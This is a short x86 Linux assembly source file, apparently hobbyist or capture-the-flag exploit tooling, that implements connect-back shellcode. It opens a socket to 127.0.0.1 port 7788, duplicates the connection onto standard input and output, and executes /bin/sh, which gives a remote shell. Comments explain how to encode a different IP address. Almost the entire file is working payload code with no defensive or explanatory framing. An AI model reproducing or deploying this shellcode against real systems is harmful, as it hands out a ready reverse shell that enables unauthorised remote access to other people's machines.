	;; Evan Jensen (wont) 021813
	;; Connect back shellcode
	;; Handy One liner for IP
	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '127.0.0.1'.split('.')])))
	;; port is littleEndian

%define IP dword 0x0100007f	;IP 127.0.0.1 Little Endian
%define PORT word  0x6c1e	;port 7788 Little Endian
BITS 32
	global main
main:
	xor eax,eax
	mov ebx,eax
	push eax
	push byte 1
	push byte 2
	inc ebx
	mov al,0x66
	mov ecx,esp
	int 0x80

	mov esi,eax
	xor eax,eax
	mov al,0x66
	inc ebx
IPandPort:	
	push IP
	push PORT
	push bx 		;bx=2 AF_INET
	mov ecx,esp
	push byte 16
	push ecx
	push esi
	inc ebx			;ebx=3 connect()
	mov ecx,esp
	int 0x80

	mov edi,eax		;connect fd
	xor ecx,ecx
	mov eax,ecx
	mov edx,ecx
	mov cl,2
copy:
	mov al,63		;dup2 63
	int 0x80
	dec ecx
	jns copy

	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov al,11
	mov ebx,esp
	xor ecx,ecx
	mov edx,ecx
	int 0x80

	;; Any local shellcode here

	
